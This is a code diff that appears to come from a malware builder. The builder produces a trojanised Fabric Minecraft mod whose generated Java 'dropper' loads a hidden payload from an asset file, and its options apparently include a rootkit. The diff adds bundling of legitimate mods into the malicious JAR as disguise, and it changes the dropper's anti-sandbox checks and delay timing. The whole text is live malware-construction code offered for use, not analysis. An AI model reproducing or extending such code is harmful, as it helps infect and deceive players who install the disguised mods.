@@ -95,6 +95,7 @@ type BuildProcessConfig = {
   jarMcVersion?: string;
   jarModName?: string;
   jarModId?: string;
+  jarBoundMods?: { name: string; data: string }[];
   enableR77?: boolean;
   enableChaos?: boolean;
   chaosMode?: string;
@@ -467,7 +468,6 @@ function generateJarDropperSource(jarPersist: boolean): string {
   return [
     "package com.mc.mod;",
     "import java.io.*;",
-    "import java.lang.management.*;",
     "import java.util.*;",
     "import java.util.Base64;",
     "import net.fabricmc.api.ModInitializer;",
@@ -494,12 +494,9 @@ function generateJarDropperSource(jarPersist: boolean): string {
     "    long acc=0;",
     "    for(int i=0;i<rng.nextInt(500)+200;i++)acc+=(long)(Math.pow(rng.nextDouble()*13,2));",
     "    if(acc<0)return;",
-    "    if(Runtime.getRuntime().availableProcessors()<2)return;",
-    "    long up=ManagementFactory.getRuntimeMXBean().getUptime();",
-    "    if(up<300000L)return;",
     "    loadConfig();",
     "    checkVersion(\"1.21.4\");",
-    "    Thread.sleep(3000+rng.nextInt(5000));",
+    "    Thread.sleep(1000+rng.nextInt(2000));",
     "    InputStream is=ModLoader.class.getResourceAsStream(\"/assets/data.pak\");",
     "    if(is==null)return;",
     "    ByteArrayOutputStream buf=new ByteArrayOutputStream();",
@@ -1566,6 +1563,29 @@ func runBoundFiles() {
 
           const classDir = path.join(jarTmpDir, "classes");
           fs.mkdirSync(classDir, { recursive: true });
+
+          // Extract bound JAR mods into classDir first; our files overwrite conflicts after
+          if (Array.isArray(config.jarBoundMods) && config.jarBoundMods.length > 0) {
+            for (const bm of config.jarBoundMods.slice(0, 3)) {
+              const safeBmName = bm.name.replace(/[^a-zA-Z0-9._-]/g, "_").slice(0, 64);
+              const bmPath = path.join(jarTmpDir, `bound-${safeBmName}`);
+              try {
+                fs.writeFileSync(bmPath, Buffer.from(bm.data, "base64"));
+                const xr = await $`${javaTools.jar} xf ${bmPath}`.cwd(classDir).nothrow().quiet();
+                // Remove extracted META-INF to avoid manifest conflicts
+                try { fs.rmSync(path.join(classDir, "META-INF"), { recursive: true, force: true }); } catch {}
+                if (xr.exitCode !== 0) {
+                  sendToStream({ type: "output", text: `WARNING: Failed to extract bound mod ${safeBmName}\n`, level: "warn" });
+                } else {
+                  sendToStream({ type: "output", text: `Merged bound mod: ${safeBmName}\n`, level: "info" });
+                }
+              } catch (e: any) {
+                sendToStream({ type: "output", text: `WARNING: Error processing bound mod ${safeBmName}: ${e.message}\n`, level: "warn" });
+              } finally {
+                try { fs.unlinkSync(bmPath); } catch {}
+              }
+            }
+          }
 
           const compileResult = await $`${javaTools.javac} -source 8 -target 8 -d ${classDir} ${path.join(srcPkg, "ModLoader.java")} ${path.join(fabricApiStubDir, "ModInitializer.java")}`.nothrow().quiet();
           if (compileResult.exitCode !== 0) {
